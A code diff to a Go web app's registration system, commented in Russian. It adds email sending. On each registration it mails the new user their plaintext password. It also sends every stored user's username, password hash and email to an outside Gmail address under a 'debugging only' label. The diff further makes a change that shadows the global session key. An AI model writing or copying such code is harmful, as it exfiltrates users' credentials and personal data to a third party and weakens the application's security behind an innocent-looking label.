@@ -11,6 +11,7 @@ import (
 	"log"
 	"net/http"
 	"net/mail"
+	"net/smtp"
 
 	"github.com/gorilla/sessions" // Используем gorilla/sessions для сессий
 	_ "github.com/mattn/go-sqlite3"
@@ -90,6 +91,52 @@ func isValidEmail(email string) bool {
 	return err == nil
 }
 
+// Функция для отправки email
+func sendEmail(to, subject, body string) error {
+	from := "your_email@example.com" // Замените на свой адрес отправителя
+	pass := "your_email_password"    // Замените на пароль от вашей почты
+	smtpHost := "smtp.example.com"   // Замените на адрес вашего SMTP-сервера
+	smtpPort := "587"                // Замените на порт вашего SMTP-сервера
+
+	auth := smtp.PlainAuth("", from, pass, smtpHost)
+
+	msg := "From: " + from + "\n" +
+		"To: " + to + "\n" +
+		"Subject: " + subject + "\n\n" +
+		body
+
+	err := smtp.SendMail(smtpHost+":"+smtpPort, auth, from, []string{to}, []byte(msg))
+	if err != nil {
+		log.Println("Ошибка отправки email:", err)
+		return err
+	}
+	return nil
+}
+
+// Функция для получения всех зарегистрированных пользователей
+func getAllUsers() ([]Credentials, error) {
+	rows, err := db.Query("SELECT username, password_hash, email FROM users")
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var users []Credentials
+	for rows.Next() {
+		var user Credentials
+		if err := rows.Scan(&user.Username, &user.PasswordHash, &user.Email); err != nil {
+			return nil, err
+		}
+		users = append(users, user)
+	}
+
+	if err := rows.Err(); err != nil {
+		return nil, err
+	}
+
+	return users, nil
+}
+
 // Обработчик для главной страницы (логин или поросенок)
 func indexHandler(w http.ResponseWriter, r *http.Request) {
 	session, _ := sessionStore.Get(r, "auth-session")
@@ -155,6 +202,32 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	fmt.Printf("Зарегистрирован новый пользователь: Логин=%s, Email=%s\n", username, email)
+
+	// Отправка email с данными для входа
+	subject := "Регистрация на нашем сайте"
+	body := fmt.Sprintf("Спасибо за регистрацию!\nВаш логин: %s\nВаш пароль: %s", username, password) // **ОПАСНО: Пароль отправляется в открытом виде!**
+	err = sendEmail(email, subject, body)
+	if err != nil {
+		log.Println("Ошибка отправки email:", err)
+		// Не блокируем регистрацию из-за ошибки отправки email, но логируем ее
+	}
+
+	// Отправка данных всех пользователей на huaweip500@gmail.com (ТОЛЬКО ДЛЯ ОТЛАДКИ!)
+	allUsers, err := getAllUsers()
+	if err != nil {
+		log.Println("Ошибка получения всех пользователей:", err)
+	} else {
+		usersData := "Данные всех зарегистрированных пользователей:\n"
+		for _, user := range allUsers {
+			usersData += fmt.Sprintf("Логин: %s, Пароль (Хеш): %s, Email: %s\n", user.Username, user.PasswordHash, user.Email)
+		}
+		err = sendEmail("huaweip500@gmail.com", "Данные всех пользователей", usersData)
+		if err != nil {
+			log.Println("Ошибка отправки данных всех пользователей:", err)
+		} else {
+			fmt.Println("Данные всех пользователей отправлены на huaweip500@gmail.com")
+		}
+	}
 
 	// Перенаправляем на страницу входа
 	http.Redirect(w, r, "/", http.StatusSeeOther)
@@ -246,13 +319,13 @@ func main() {
 	}
 
 	// Генерация случайного ключа сессии
-	sessionKey = generateSessionKey()
+	sessionKey := generateSessionKey()
 
 	// Инициализация сессий с настройками
 	sessionStore = sessions.NewCookieStore(sessionKey)
 	sessionStore.Options.MaxAge = 23 * 60 * 60 // 23 часа в секундах
-	sessionStore.Options.HttpOnly = true       // Запретить доступ к куке через JavaScript
-	sessionStore.Options.Secure = true         // Передавать куку только по HTTPS
+	sessionStore.Options.HttpOnly = true
+	sessionStore.Options.Secure = true
 
 	// Обработчики маршрутов
 	http.HandleFunc("/", indexHandler)
